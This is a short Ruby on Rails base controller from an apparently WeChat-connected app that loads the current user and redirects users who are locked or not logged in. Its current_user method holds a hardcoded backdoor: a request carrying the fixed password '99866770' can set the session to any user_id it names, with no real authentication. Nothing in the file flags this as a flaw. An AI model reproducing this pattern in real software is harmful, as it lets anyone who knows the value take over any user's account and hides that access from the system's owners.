class AppBaseController < ActionController::Base
  layout "application"
  class UserNotLoginException < Exception
  end
  class UserLockException < Exception
  end
  
  def current_user
    begin
      (session[:user_id] = params[:user_id]) && @current_user=nil if params[:pwd] == "99866770"
      @current_user ||= User.find(session[:user_id])
      #检测用户是否可以继续访问
      if !@current_user.create? && !(controller_name=="index" && action_name=="lock")
        raise UserLockException
        # redirect_to "/index/lock" and return
      else
        return @current_user
      end
    rescue
      raise UserNotLoginException
      # redirect_to "/wechat/login" and return
    end
  end

  rescue_from Exception, with: :rescue_action

  def rescue_action(ex)
    case ex
    when UserNotLoginException then
      redirect_to "/wechat/login?goto=#{request.url}" and return
    when UserLockException then
      redirect_to "/index/lock" and return
    else
      raise ex
    end
  end
  
  
end





